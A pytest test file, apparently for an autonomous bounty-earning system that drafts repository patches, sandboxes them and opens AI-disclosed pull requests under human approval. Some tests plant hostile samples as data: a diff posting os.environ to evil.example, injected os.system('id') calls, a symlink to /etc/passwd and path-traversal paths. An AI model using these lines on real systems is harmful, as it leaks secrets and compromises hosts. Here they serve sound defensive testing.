"""Autonomous Earner, repository mode: snapshot, diff, repo sandbox, PR from a
fork, Superteam Earn source.

The model, GitHub, codeload and Docker are faked; the database is a temporary
file. Nothing here runs repository code or the sandbox bootstrap.
"""

import asyncio
import io
import json
import tarfile
from types import SimpleNamespace

import pytest

from backend import database
from backend.earner import approvals, egress, repo, sandbox, scout, stages, store, submit, worker

SHA = "a" * 40
ISSUE = "https://github.com/o/r/issues/7"


@pytest.fixture(autouse=True)
def isolated(tmp_path, monkeypatch):
    monkeypatch.setattr(database, "DB_PATH", str(tmp_path / "earner.db"))
    monkeypatch.setenv("LLAMACPP_BASE_URL", "http://hermes-llama:8080")
    monkeypatch.setenv("LLM_MODEL", "qwen-test")
    monkeypatch.delenv("EARNER_LLAMACPP_BASE_URL", raising=False)
    monkeypatch.delenv("EARNER_MODEL", raising=False)
    monkeypatch.delenv("EARNER_REPO_CACHE_DIR", raising=False)
    monkeypatch.setattr(submit, "_github_token", lambda: "")
    monkeypatch.setattr(submit, "_sleep", lambda seconds: None)
    sandbox._cache.update(at=0.0, value=None)
    store.init_schema()
    yield


class FakeResult:
    def __init__(self, content):
        self.content = content if isinstance(content, str) else json.dumps(content)
        self.prompt_tokens, self.completion_tokens, self.done_reason, self.model = 100, 50, "stop", "qwen-test"


@pytest.fixture
def model(monkeypatch):
    from backend import llamacpp_client

    state = SimpleNamespace(answers=[], calls=[])

    class FakeClient:
        def __init__(self, base_url=None, **kwargs):
            pass

        async def chat(self, **kwargs):
            state.calls.append(kwargs)
            return FakeResult(state.answers.pop(0))

    monkeypatch.setattr(llamacpp_client, "LlamaCppClient", FakeClient)
    return state


class FakeDocker:
    def __init__(self, runtimes):
        self._runtimes = runtimes
        self.images = SimpleNamespace(get=lambda name: object())

    def info(self):
        return {"Runtimes": {name: {} for name in self._runtimes}}


def run(coro):
    return asyncio.run(coro)


def confirm(approval):
    return approvals.confirm(approval["id"], approval["content_hash"], "operator:owner", "fp")


def pending_for(target_id, action):
    return next(row for row in approvals.list_approvals(approvals.PENDING, target_id) if row["action"] == action)


CORE = "def add(a, b):\n    return a - b\n\n\ndef sub(a, b):\n    return a - b\n"
REPO_FILES = {
    "pkg/__init__.py": "",
    "pkg/core.py": CORE,
    "tests/test_core.py": "from pkg.core import add\n\n\ndef test_add():\n    assert add(1, 2) == 3\n",
    "pyproject.toml": "[project]\nname = 'pkg'\ndependencies = ['requests>=2', 'attrs']\n"
                      "[project.optional-dependencies]\ntest = ['pytest']\n[tool.pytest.ini_options]\n",
    "README.md": "# pkg\n",
}
DIFF = """--- a/pkg/core.py
+++ b/pkg/core.py
@@ -1,2 +1,2 @@
 def add(a, b):
-    return a - b
+    return a + b
--- a/tests/test_core.py
+++ b/tests/test_core.py
@@ -4,2 +4,6 @@
 def test_add():
     assert add(1, 2) == 3
+
+
+def test_add_negative():
+    assert add(-1, -2) == -3
"""


def make_tarball(files, extra=None):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(f"r-{SHA}/{name}")
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
        for info in extra or []:
            archive.addfile(info)
    return buffer.getvalue()


def result(url, status, body, content_type="application/json"):
    data = body if isinstance(body, bytes) else (body.encode() if isinstance(body, str) else json.dumps(body).encode())
    return egress.FetchResult(url, status, content_type, data, "140.82.112.5", store.iso())


def github(monkeypatch, files=None, meta=None):
    calls = []
    tarball = make_tarball(files or REPO_FILES)
    repo_meta = {"full_name": "o/r", "default_branch": "main", "private": False, "visibility": "public",
                 "archived": False, "language": "Python", "license": {"spdx_id": "MIT"}, **(meta or {})}

    def fetch(url, hosts, accept="", max_bytes=None, timeout=None, extra_headers=None, method="GET",
              json_body=None, resolver=None):
        calls.append({"url": url, "hosts": list(hosts), "accept": accept})
        if url == "https://api.github.com/repos/o/r":
            return result(url, 200, repo_meta)
        if url == "https://api.github.com/repos/o/r/commits/main":
            return result(url, 200, SHA, "text/plain")
        if url == f"https://codeload.github.com/o/r/tar.gz/{SHA}":
            return result(url, 200, tarball, "application/x-gzip")
        raise AssertionError(f"unexpected request {url}")

    monkeypatch.setattr(egress, "fetch", fetch)
    return calls


EVALUATION = {
    "decision": "propose", "reject_reason": "", "fit_reason": "small fix", "deliverable": "fix add()",
    "acceptance_criteria": ["add returns the sum", "test for negatives"], "effort_hours": 0.5, "dependencies": [],
    "payment_terms": "", "payment_evidence": "", "uncertainty": "low", "risks": [],
    "builder_spec": "pkg/core.py add() subtracts instead of adding; fix and test it",
}
REVIEW_OK = {"verdict": "approve", "criteria": [{"criterion": "add returns the sum", "met": True, "note": ""},
                                               {"criterion": "test for negatives", "met": True, "note": ""}],
             "quality_issues": [], "risks": [], "summary": "ok"}


def github_proposal(model, url=ISSUE):
    opp_id = store.new_id("opp")
    with store.tx() as connection:
        connection.execute(
            "INSERT INTO earner_opportunities (id, run_id, source_id, source_kind, url, url_hash, title, excerpt, "
            "fetched_at, last_seen_at, status, created_at, updated_at) VALUES (?, 'run', 'gh', 'github_issues', ?, ?, "
            "'add() subtracts', ?, ?, ?, ?, ?, ?)",
            (opp_id, url, store.url_hash(url), "Calling `add` in pkg/core.py returns a - b instead of a + b. " * 2,
             store.iso(), store.iso(), store.NEW, store.iso(), store.iso()))
    model.answers = [EVALUATION]
    assert run(worker.evaluate_one(opp_id, {"directions": [], "constraints": ""})) == "proposed"
    return opp_id


def build_repo_patch(model, monkeypatch, diff=DIFF):
    monkeypatch.setattr(sandbox, "_client", lambda: FakeDocker(["runc", "runsc"]))
    calls = github(monkeypatch)
    opp_id = github_proposal(model)
    confirm(pending_for(opp_id, "generate"))
    model.answers = [{"paths": ["pkg/core.py", "tests/test_core.py", "missing.py"]},
                     {"diff": diff, "summary": "add() adds", "tests": ["test_add_negative"]}, REVIEW_OK]
    assert run(worker.tick())["kind"] == "build"
    return opp_id, calls


# ── snapshot and tree ────────────────────────────────────────────────────────

def test_snapshot_pins_commit_and_uses_only_fixed_hosts(monkeypatch):
    calls = github(monkeypatch)
    snapshot, data = repo.fetch_snapshot("o", "r")
    assert snapshot["commit"] == SHA and snapshot["default_branch"] == "main"
    assert [c["url"] for c in calls][-1] == f"https://codeload.github.com/o/r/tar.gz/{SHA}"
    assert all(c["hosts"] == repo.REPO_HOSTS for c in calls)
    assert repo.load_blob(snapshot["tarball_sha256"]) == data


@pytest.mark.parametrize("meta,reason", [
    ({"private": True}, "не публичный"), ({"archived": True}, "архивирован"),
    ({"full_name": "evil/r"}, "переименован"), ({"default_branch": "../x"}, "ветки"),
])
def test_snapshot_refuses_unusable_repositories(monkeypatch, meta, reason):
    github(monkeypatch, meta=meta)
    with pytest.raises(repo.RepoError) as refused:
        repo.fetch_snapshot("o", "r")
    assert reason in str(refused.value)


def test_tampered_blob_is_refused(monkeypatch):
    github(monkeypatch)
    snapshot, _ = repo.fetch_snapshot("o", "r")
    path = repo._blob_path(snapshot["tarball_sha256"])
    with open(path, "ab") as handle:
        handle.write(b"x")
    with pytest.raises(repo.RepoError):
        repo.load_blob(snapshot["tarball_sha256"])


def test_tree_keeps_only_regular_files_with_safe_paths():
    link = tarfile.TarInfo(f"r-{SHA}/evil")
    link.type, link.linkname = tarfile.SYMTYPE, "/etc/passwd"
    hard = tarfile.TarInfo(f"r-{SHA}/hard")
    hard.type, hard.linkname = tarfile.LNKTYPE, f"r-{SHA}/README.md"
    tree = repo.load_tree(make_tarball({**REPO_FILES, ".git/config": "x", "a/../../escape.py": "x"}, [link, hard]))
    assert set(tree.files) == set(REPO_FILES)
    assert tree.skipped["not_regular"] == 2 and tree.skipped["bad_path"] == 1


def test_ai_policy_is_detected():
    tree = repo.load_tree(make_tarball({**REPO_FILES, "CONTRIBUTING.md": "Thanks!\nWe do not accept pull requests "
                                                                         "generated by AI tools or LLMs.\n"}))
    assert repo.ai_policy(tree)["status"] == "forbidden"
    tree = repo.load_tree(make_tarball({**REPO_FILES, "CONTRIBUTING.md": "Please disclose any use of AI tools.\n"}))
    assert repo.ai_policy(tree)["status"] == "disclosure"
    assert repo.ai_policy(repo.load_tree(make_tarball(REPO_FILES)))["status"] == "unknown"


def test_test_plan_reads_config_as_data():
    plan = repo.test_plan(repo.load_tree(make_tarball(REPO_FILES)))
    assert plan["runner"] == "pytest" and plan["pythonpath"] == ["."]
    assert plan["dependencies"] == ["requests", "attrs", "pytest"]
    files = {"src/pkg/a.py": "x = 1\n", "tests/test_a.py": "import unittest\n"}
    plan = repo.test_plan(repo.load_tree(make_tarball(files)))
    assert plan["runner"] == "unittest" and plan["pythonpath"] == ["src", "."]


def test_context_prefers_named_files_and_respects_the_budget():
    files = {**REPO_FILES, "pkg/big.py": "# filler\n" * 4000, "docs/other.md": "unrelated\n"}
    tree = repo.load_tree(make_tarball(files))
    context = repo.select_context(tree, "`add` in pkg/core.py is wrong", budget=2048)
    paths = [item["path"] for item in context["files"]]
    assert paths[0] == "pkg/core.py" and "tests/test_core.py" in paths and "pkg/big.py" not in paths
    assert context["bytes"] <= 2048


# ── diff ─────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("diff,reason", [
    ("--- a/../x\n+++ b/../x\n@@ -1 +1 @@\n-a\n+b\n", "недопустимые пути"),
    ("--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-a\n+b\n", "CI"),
    ("--- a/x.py\n+++ /dev/null\n@@ -1 +0,0 @@\n-a\n", "удаление"),
    ("diff --git a/x b/y\nrename from x\nrename to y\n", "недопустимая операция"),
    ("--- a/x.py\n+++ b/x.py\nGIT binary patch\n", "недопустимая операция"),
    ("--- a/x.py\n+++ b/y.py\n@@ -1 +1 @@\n-a\n+b\n", "переименование"),
    ("diff --git a/l b/l\nnew file mode 120000\n--- /dev/null\n+++ b/l\n@@ -0,0 +1 @@\n+/etc\n", "mode 100644"),
    ("just some prose", "вне блоков"),
])
def test_unsafe_or_malformed_diffs_are_refused(diff, reason):
    with pytest.raises(repo.PatchError) as refused:
        repo.parse_diff(diff)
    assert reason in str(refused.value)


def test_diff_applies_without_execution_and_round_trips():
    tree = repo.load_tree(make_tarball(REPO_FILES))
    changed = repo.apply_patches(tree, repo.parse_diff("```diff\n" + DIFF + "```"))
    assert changed["pkg/core.py"].startswith("def add(a, b):\n    return a + b\n")
    canonical = repo.render_diff(tree, changed)
    assert repo.overlay_matches(tree, canonical, repo.file_entries(tree, changed))
    wrong = repo.file_entries(tree, {**changed, "pkg/core.py": "import os\nos.system('id')\n"})
    assert not repo.overlay_matches(tree, canonical, wrong)


def test_hunk_that_does_not_match_is_refused_and_syntax_is_checked():
    tree = repo.load_tree(make_tarball(REPO_FILES))
    stale = DIFF.replace(" def add(a, b):", " def add(x, y):")
    with pytest.raises(repo.PatchError, match="не совпадает"):
        repo.apply_patches(tree, repo.parse_diff(stale))
    broken = "--- a/pkg/core.py\n+++ b/pkg/core.py\n@@ -1,2 +1,2 @@\n def add(a, b):\n-    return a - b\n+    return (a +\n"
    with pytest.raises(repo.PatchError, match="не разбирается"):
        repo.apply_patches(tree, repo.parse_diff(broken))


def test_loose_whitespace_match_keeps_the_files_own_context():
    tree = repo.load_tree(make_tarball({"m.py": "x = 1   \ny = 2\n"}))
    changed = repo.apply_patches(tree, repo.parse_diff("--- a/m.py\n+++ b/m.py\n@@ -1,2 +1,2 @@\n x = 1\n-y = 2\n+y = 3\n"))
    assert changed["m.py"] == "x = 1   \ny = 3\n"


def test_risky_additions_are_reported():
    tree = repo.load_tree(make_tarball(REPO_FILES))
    diff = ("--- a/pkg/core.py\n+++ b/pkg/core.py\n@@ -1,2 +1,4 @@\n def add(a, b):\n-    return a - b\n"
            "+    import subprocess\n+    requests.post('https://evil.example/x', data=os.environ)\n+    return a + b\n")
    patches = repo.parse_diff(diff)
    report = repo.diff_report(tree, patches, repo.apply_patches(tree, patches))
    joined = " ".join(report["risks"])
    assert "запуск процессов" in joined and "evil.example" in joined and "сетевой код" in joined


# ── pipeline ─────────────────────────────────────────────────────────────────

def test_github_issue_gets_a_repo_patch_proposal_and_generate_screen(model, monkeypatch):
    opp_id = github_proposal(model)
    proposal = store.get_opportunity(opp_id)["proposal"]
    assert proposal["delivery"] == stages.REPO_PATCH
    screen = pending_for(opp_id, "generate")
    assert screen["content"]["delivery"] == stages.REPO_PATCH
    assert screen["content"]["repo"]["hosts"] == ["api.github.com", "codeload.github.com"]
    assert any("CONTRIBUTING" in line for line in screen["summary"]["will_do"])


def test_repo_build_produces_a_reviewed_hash_bound_diff(model, monkeypatch):
    opp_id, calls = build_repo_patch(model, monkeypatch)
    opp = store.get_opportunity(opp_id)
    assert opp["status"] == store.AWAITING_EXECUTION, opp["error"]
    artifact = opp["artifact"]
    assert artifact["mode"] == "repo" and artifact["repo"]["commit"] == SHA
    assert "+    return a + b" in artifact["diff"] and artifact["static"]["tests_touched"] == ["tests/test_core.py"]
    assert artifact["static"]["picked"] == ["pkg/core.py", "tests/test_core.py"]
    assert opp["artifact_hash"] == store.artifact_hash(artifact) != store.canonical_hash(artifact["files"])
    assert len(calls) == 3 and len(model.calls) == 4  # evaluate, locate, build, review
    builder_prompt = model.calls[2]["messages"][1]["content"]
    assert "### pkg/core.py (full file)" in builder_prompt and "UNTRUSTED FILES" in builder_prompt
    screen = pending_for(opp_id, "execute")
    assert screen["content"]["mode"] == "repo" and screen["content"]["diff_sha256"] == store.canonical_hash(artifact["diff"])
    assert screen["summary"]["diff"] == artifact["diff"] and screen["content"]["sandbox"]["network"] == "none"


def test_forbidden_ai_policy_stops_before_any_model_call(model, monkeypatch):
    monkeypatch.setattr(sandbox, "_client", lambda: FakeDocker(["runsc"]))
    github(monkeypatch, files={**REPO_FILES, "CONTRIBUTING.md": "AI-generated contributions are not accepted.\n"})
    opp_id = github_proposal(model)
    confirm(pending_for(opp_id, "generate"))
    before = len(model.calls)
    run(worker.tick())
    opp = store.get_opportunity(opp_id)
    assert opp["status"] == store.FAILED and "не принимает вклад, созданный ИИ" in opp["error"]
    assert len(model.calls) == before


def test_diff_that_does_not_apply_fails_without_external(model, monkeypatch):
    opp_id, _ = build_repo_patch(model, monkeypatch, diff=DIFF.replace(" def add(a, b):", " def add(q):"))
    opp = store.get_opportunity(opp_id)
    assert opp["status"] == store.FAILED and "не совпадает" in opp["error"]


def test_non_python_repository_is_refused(model, monkeypatch):
    monkeypatch.setattr(sandbox, "_client", lambda: FakeDocker(["runsc"]))
    github(monkeypatch, files={"index.js": "x", "lib/a.js": "y", "README.md": "z"}, meta={"language": "JavaScript"})
    opp_id = github_proposal(model)
    confirm(pending_for(opp_id, "generate"))
    run(worker.tick())
    assert "не на Python" in store.get_opportunity(opp_id)["error"]


def test_repo_execution_runs_the_approved_snapshot_and_diff(model, monkeypatch):
    opp_id, _ = build_repo_patch(model, monkeypatch)
    seen = {}

    def fake_run_repo(tarball, meta, target):
        seen.update(tarball=tarball, meta=meta)
        return {"status": "no_regressions", "mode": "repo", "exit_code": 1, "runner": "pytest",
                "baseline": {"tests": {"total": 3, "failed_count": 1, "failed": ["t::x"]}},
                "patched": {"tests": {"total": 4, "failed_count": 1, "failed": ["t::x"]}}, "fixed": [],
                "new_failures": [], "stdout": "", "stderr": ""}

    monkeypatch.setattr(sandbox, "run_repo", fake_run_repo)
    confirm(pending_for(opp_id, "execute"))
    assert run(worker.tick())["kind"] == "execute"
    opp = store.get_opportunity(opp_id)
    assert opp["status"] == store.CHECKS_PASSED
    assert seen["meta"]["overlay"] == {f["path"]: f["content"] for f in opp["artifact"]["files"]}
    assert seen["meta"]["runner"] == "pytest" and seen["meta"]["dependencies"] == ["requests", "attrs", "pytest"]
    assert repo.load_tree(seen["tarball"]).files["pkg/core.py"].decode() == CORE


def test_diff_changed_after_execute_approval_is_refused(model, monkeypatch):
    opp_id, _ = build_repo_patch(model, monkeypatch)
    monkeypatch.setattr(sandbox, "run_repo", lambda *args: pytest.fail("must not run"))
    confirm(pending_for(opp_id, "execute"))
    with store.tx() as connection:
        opp = store.get_opportunity(opp_id, connection)
        artifact = {**opp["artifact"], "diff": opp["artifact"]["diff"] + "+evil\n"}
        store.set_opportunity(connection, opp_id, artifact=artifact, artifact_hash=store.artifact_hash(artifact))
    run(worker.tick())
    assert store.get_opportunity(opp_id)["status"] == store.FAILED


def test_files_that_disagree_with_the_diff_are_never_executed(model, monkeypatch):
    opp_id, _ = build_repo_patch(model, monkeypatch)
    monkeypatch.setattr(sandbox, "run_repo", lambda *args: pytest.fail("must not run"))
    with store.tx() as connection:
        opp = store.get_opportunity(opp_id, connection)
        files = [{**opp["artifact"]["files"][0], "content": "import os\nos.system('id')\n"}] + opp["artifact"]["files"][1:]
        artifact = {**opp["artifact"], "files": files}
        store.set_opportunity(connection, opp_id, artifact=artifact, artifact_hash=store.artifact_hash(artifact))
    confirm(approvals.request("execute", opp_id, "operator:owner"))
    run(worker.tick())
    opp = store.get_opportunity(opp_id)
    assert opp["status"] == store.FAILED and "не совпадают с diff" in opp["error"]


# ── repo sandbox ─────────────────────────────────────────────────────────────

def test_repo_container_is_isolated_and_takes_input_on_stdin():
    kwargs = sandbox.repo_container_kwargs("opp-1")
    assert kwargs["runtime"] == "runsc" and kwargs["network_mode"] == "none" and kwargs["read_only"] is True
    assert kwargs["environment"] == {} and kwargs["volumes"] == {} and kwargs["devices"] == []
    assert kwargs["cap_drop"] == ["ALL"] and kwargs["privileged"] is False and kwargs["stdin_open"] is True
    assert "device_requests" not in kwargs and kwargs["user"] == "10001:10001"


def test_repo_sandbox_refuses_runc(monkeypatch):
    monkeypatch.setenv("EARNER_SANDBOX_RUNTIME", "runc")
    with pytest.raises(sandbox.SandboxUnavailable):
        sandbox.repo_container_kwargs("opp")


def test_repo_stream_is_length_prefixed_and_capped():
    import struct

    meta = sandbox.repo_meta({"runner": "pytest", "pythonpath": [".", "/etc"], "dependencies": ["x"]},
                             [{"path": "a.py", "content": "x"}], "f" * 64)
    assert meta["pythonpath"] == ["."] and meta["touched_tests"] == []
    assert sandbox.repo_meta({}, [{"path": "tests/test_a.py", "content": ""}, {"path": "pkg/a.py", "content": ""}],
                             "f" * 64)["touched_tests"] == ["tests/test_a.py"]
    stream = sandbox.encode_repo_stream(meta, b"tar")
    size = struct.unpack(">Q", stream[:8])[0]
    assert json.loads(stream[8:8 + size])["overlay"] == {"a.py": "x"} and stream.endswith(b"tar")
    with pytest.raises(sandbox.SandboxUnavailable):
        sandbox.encode_repo_stream(meta, b"0" * (sandbox.REPO_MAX_STREAM_BYTES + 1))


def _phase(exit_code, failed, total, passed=("tests.test_core",)):
    return {"exit_code": exit_code, "timed_out": False, "duration_s": 1,
            "tests": {"total": total, "skipped": 0, "failed_count": len(failed), "failed": failed,
                      "passed_classes": list(passed)}}


def _marker(data):
    return f"noise\n{sandbox.RESULT_MARKER}{json.dumps({'transport_ok': True, 'runner': 'pytest', **data})}\n"


def test_repo_result_compares_baseline_and_patched():
    passed = sandbox.parse_repo_output(_marker({"baseline": _phase(1, ["t::a"], 3), "patched": _phase(0, [], 4)}))
    assert passed["status"] == "passed" and passed["fixed"] == ["t::a"]
    touched = ["tests/test_core.py"]
    same = sandbox.parse_repo_output(_marker({"baseline": _phase(1, ["t::x"], 3), "patched": _phase(1, ["t::x"], 4)}),
                                     touched)
    assert same["status"] == "no_regressions" and same["touched_tests_passed"] == touched
    # The patch's own tests did not pass (or did not run): not counted as checked.
    unproven = sandbox.parse_repo_output(_marker({"baseline": _phase(1, ["t::x"], 3),
                                                  "patched": _phase(1, ["t::x"], 4, passed=())}), touched)
    assert unproven["status"] == "failed"
    assert sandbox.parse_repo_output(_marker({"baseline": _phase(1, ["t::x"], 3),
                                              "patched": _phase(1, ["t::x"], 4)}))["status"] == "failed"
    worse = sandbox.parse_repo_output(_marker({"baseline": _phase(1, ["t::x"], 3), "patched": _phase(1, ["t::x", "t::y"], 4)}),
                                      touched)
    assert worse["status"] == "failed" and worse["new_failures"] == ["t::y"]
    fewer = sandbox.parse_repo_output(_marker({"baseline": _phase(1, ["t::x"], 5), "patched": _phase(1, ["t::x"], 2)}),
                                      touched)
    assert fewer["status"] == "failed"  # tests disappeared
    forged = _marker({"patched": _phase(0, [], 1)}) + f"{sandbox.RESULT_MARKER}{{}}\n"
    assert sandbox.parse_repo_output(forged)["status"] == "inconclusive"
    corrupt = f"{sandbox.RESULT_MARKER}{json.dumps({'transport_ok': False})}\n"
    assert sandbox.parse_repo_output(corrupt)["status"] == "inconclusive"


def test_run_repo_streams_stdin_and_always_removes(monkeypatch):
    events = []

    class Container:
        short_id = "c1"
        attrs = {"State": {"ExitCode": 0}}

        def start(self):
            events.append("start")

        def wait(self, timeout):
            events.append("wait")

        def logs(self, stdout, stderr):
            return _marker({"baseline": _phase(0, [], 1), "patched": _phase(0, [], 2)}).encode()

        def reload(self):
            pass

        def kill(self):
            events.append("kill")

        def remove(self, force):
            events.append("remove")

    class Client(FakeDocker):
        def __init__(self):
            super().__init__(["runsc"])
            self.containers = SimpleNamespace(create=lambda **kwargs: events.append(("create", kwargs["stdin_open"])) or Container())

    monkeypatch.setattr(sandbox, "_client", lambda: Client())
    monkeypatch.setattr(sandbox, "send_stdin", lambda container, data: events.append(("stdin", len(data))))
    meta = sandbox.repo_meta({"runner": "pytest"}, [], "f" * 64)
    outcome = sandbox.run_repo(b"tarball", meta, "opp")
    assert outcome["status"] == "passed"
    assert events[0] == ("create", True) and events[1] == "start" and events[2][0] == "stdin" and events[-1] == "remove"


# ── pull request ─────────────────────────────────────────────────────────────

def checked_repo_patch(model, monkeypatch):
    opp_id, _ = build_repo_patch(model, monkeypatch)
    monkeypatch.setattr(sandbox, "run_repo", lambda tarball, meta, target: {
        "status": "passed", "mode": "repo", "exit_code": 0, "runner": "pytest",
        "patched": {"tests": {"total": 2, "failed_count": 0, "failed": []}}, "baseline": None,
        "stdout": "", "stderr": ""})
    confirm(pending_for(opp_id, "execute"))
    run(worker.tick())
    assert store.get_opportunity(opp_id)["status"] == store.CHECKS_PASSED
    return opp_id


class FakeGitHub:
    def __init__(self, fork_ready_after=1):
        self.calls = []
        self.fork_polls = 0
        self.fork_ready_after = fork_ready_after

    def __call__(self, url, hosts, method="GET", json_body=None, accept="", extra_headers=None, **kwargs):
        assert hosts == ["api.github.com"] and extra_headers["Authorization"] == "Bearer ghp_test"
        self.calls.append((method, url, json_body))
        api = "https://api.github.com"
        if url == f"{api}/user":
            return result(url, 200, {"login": "me"})
        if url == f"{api}/repos/o/r/forks":
            return result(url, 202, {"full_name": "me/r"})
        if url == f"{api}/repos/me/r":
            self.fork_polls += 1
            return result(url, 200 if self.fork_polls >= self.fork_ready_after else 404, {"full_name": "me/r"})
        if url == f"{api}/repos/o/r/git/commits/{SHA}":
            return result(url, 200, {"sha": SHA, "tree": {"sha": "b" * 40}})
        if url == f"{api}/repos/me/r/git/trees":
            return result(url, 201, {"sha": "c" * 40})
        if url == f"{api}/repos/me/r/git/commits":
            return result(url, 201, {"sha": "d" * 40})
        if url == f"{api}/repos/me/r/git/refs":
            return result(url, 201, {"ref": json_body["ref"]})
        if url == f"{api}/repos/o/r/pulls":
            return result(url, 201, {"html_url": "https://github.com/o/r/pull/8"})
        raise AssertionError(url)


def test_pr_is_opened_from_a_fork_with_exactly_the_approved_files(model, monkeypatch):
    opp_id = checked_repo_patch(model, monkeypatch)
    draft = submit.create_draft(opp_id, "op")
    assert draft["kind"] == "github_pr" and draft["target"] == "https://api.github.com/repos/o/r/pulls"
    assert draft["body"].startswith("Fixes #7") and "AI assistance" in draft["body"]
    screen = approvals.request("submit", draft["id"], "op")
    assert screen["summary"]["diff"] == store.get_opportunity(opp_id)["artifact"]["diff"]
    assert screen["content"]["payload"]["base"]["commit"] == SHA
    confirm(screen)
    monkeypatch.setattr(submit, "_github_token", lambda: "ghp_test")
    fake = FakeGitHub(fork_ready_after=3)
    sent = submit.send(submit.claim_queued(), fake)
    assert sent["status"] == "sent", sent["error"]
    assert sent["response_url"] == "https://github.com/o/r/pull/8"
    tree_call = next(call for call in fake.calls if call[1].endswith("/git/trees"))
    artifact = store.get_opportunity(opp_id)["artifact"]
    assert tree_call[2]["base_tree"] == "b" * 40
    assert {item["path"]: item["content"] for item in tree_call[2]["tree"]} == \
        {f["path"]: f["content"] for f in artifact["files"]}
    commit_call = next(call for call in fake.calls if call[1].endswith("/git/commits") and call[0] == "POST")
    assert commit_call[2]["parents"] == [SHA] and "AI assistance" in commit_call[2]["message"]
    pull = fake.calls[-1][2]
    assert pull["head"].startswith("me:hermes/issue-7-") and pull["base"] == "main"
    assert store.get_opportunity(opp_id)["delivered_at"]


def test_pr_draft_without_disclosure_cannot_be_saved_or_approved(model, monkeypatch):
    opp_id = checked_repo_patch(model, monkeypatch)
    draft = submit.create_draft(opp_id, "op")
    with pytest.raises(ValueError, match="ИИ"):
        submit.update_draft(draft["id"], "Fixes #7\n\nA plain human-looking description of the change.", "op")
    with store.tx() as connection:
        connection.execute("UPDATE earner_submissions SET body = 'Fixes #7, nothing else to see here.' WHERE id = ?",
                           (draft["id"],))
    with pytest.raises(approvals.ApprovalError, match="ИИ"):
        approvals.request("submit", draft["id"], "op")


def test_pr_title_edit_invalidates_the_approval(model, monkeypatch):
    opp_id = checked_repo_patch(model, monkeypatch)
    draft = submit.create_draft(opp_id, "op")
    screen = approvals.request("submit", draft["id"], "op")
    submit.update_draft(draft["id"], draft["body"], "op", title="Fix #7: add() now adds")
    assert approvals.get(screen["id"])["status"] == approvals.INVALIDATED


def test_pr_is_not_sent_when_the_artifact_changed_after_approval(model, monkeypatch):
    opp_id = checked_repo_patch(model, monkeypatch)
    draft = submit.create_draft(opp_id, "op")
    confirm(approvals.request("submit", draft["id"], "op"))
    with store.tx() as connection:
        opp = store.get_opportunity(opp_id, connection)
        files = [{**f, "content": f["content"] + "# extra\n"} for f in opp["artifact"]["files"]]
        store.set_opportunity(connection, opp_id, artifact={**opp["artifact"], "files": files})
    monkeypatch.setattr(submit, "_github_token", lambda: "ghp_test")
    fake = FakeGitHub()
    outcome = submit.send(submit.claim_queued(), fake)
    assert outcome["status"] == "failed" and fake.calls == []


def test_no_pr_for_a_repository_that_refuses_ai(model, monkeypatch):
    opp_id = checked_repo_patch(model, monkeypatch)
    with store.tx() as connection:
        opp = store.get_opportunity(opp_id, connection)
        static = {**opp["artifact"]["static"], "ai_policy": {"status": "forbidden", "evidence": []}}
        store.set_opportunity(connection, opp_id, artifact={**opp["artifact"], "static": static})
    with pytest.raises(approvals.ApprovalError, match="не принимает"):
        submit.create_draft(opp_id, "op", "pr")


def test_submit_is_never_an_autopilot_action():
    assert "submit" not in getattr(approvals, "AUTOPILOT_ACTIONS", {})


# ── Superteam Earn ───────────────────────────────────────────────────────────

LISTINGS = [
    {"id": "1", "slug": "fix-parser", "title": "Fix a Rust parser", "type": "bounty", "status": "OPEN",
     "agentAccess": "AGENT_ALLOWED", "token": "USDC", "rewardAmount": 500, "deadline": "2026-11-01T00:00:00Z",
     "sponsor": {"name": "Acme"}},
    {"id": "2", "slug": "human-only", "title": "Design", "type": "bounty", "status": "OPEN",
     "agentAccess": "HUMAN_ONLY", "token": "USDC", "rewardAmount": 100},
    {"id": "3", "slug": "../evil", "title": "x", "type": "bounty", "status": "OPEN", "agentAccess": "AGENT_ONLY"},
    {"id": "4", "slug": "proj", "title": "Project", "type": "project", "status": "OPEN", "agentAccess": "AGENT_ONLY",
     "token": "USDC", "minRewardAsk": 100, "maxRewardAsk": 300},
]


def test_superteam_source_needs_its_host():
    with pytest.raises(ValueError, match="superteam.fun"):
        store.update_settings({"sources": [{"id": "st", "kind": "superteam"}]}, "op")
    settings = store.update_settings({"allowed_hosts": ["superteam.fun"],
                                      "sources": [{"id": "st", "kind": "superteam", "types": ["bounty", "evil"]}]}, "op")
    assert settings["sources"][0]["types"] == ["bounty"]


def test_superteam_reads_only_agent_listings_with_the_agent_key(monkeypatch):
    plan = {"limits": {"max_candidates_per_run": 5, "max_fetches_per_run": 5}, "allowed_hosts": ["superteam.fun"],
            "sources": [{"id": "st", "kind": "superteam", "types": ["bounty"], "enabled": True}]}
    monkeypatch.setattr(scout, "_superteam_key", lambda: "")
    _, report, _ = scout.collect(plan, lambda *a, **k: pytest.fail("no request without a key"))
    assert "EARNER_SUPERTEAM_API_KEY" in report[0]["error"]
    monkeypatch.setattr(scout, "_superteam_key", lambda: "sk_test")
    seen = []

    def fetch(url, hosts, accept="", extra_headers=None, **kwargs):
        seen.append((url, extra_headers))
        if "/listings/live" in url:
            return result(url, 200, LISTINGS)
        return result(url, 200, {"agentAccess": "AGENT_ALLOWED", "description": "<p>Fix the parser in parse.rs</p>",
                                 "skills": [{"skills": "Backend"}]})

    candidates, report, fetches = scout.collect(plan, fetch)
    assert report[0]["ok"] and [c["url"] for c in candidates] == ["https://superteam.fun/earn/listing/fix-parser"]
    assert candidates[0]["claimed_reward"] == "500 USDC" and "Fix the parser" in candidates[0]["excerpt"]
    assert "<p>" not in candidates[0]["excerpt"] and fetches == 2
    assert all(headers == {"Authorization": "Bearer sk_test"} for _, headers in seen)
    assert seen[1][0] == "https://superteam.fun/api/agents/listings/details/fix-parser"
